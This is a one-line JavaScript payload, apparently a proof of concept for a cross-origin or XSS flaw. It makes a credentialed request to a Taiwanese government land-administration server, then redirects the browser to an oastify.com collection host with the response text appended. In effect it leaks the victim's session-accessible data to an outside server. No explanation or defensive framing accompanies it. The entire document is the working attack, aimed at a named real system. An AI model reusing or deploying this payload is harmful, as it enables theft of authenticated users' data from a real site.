var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ep-t.land.nat.gov.tw/O/',true); req.withCredentials = true;req.send();function reqListener() {location='https://jsfq80avpsakvdiiie4fkbqdd4jv7zvo.oastify.com/log?key=' + this.responseText;};prompt("meow")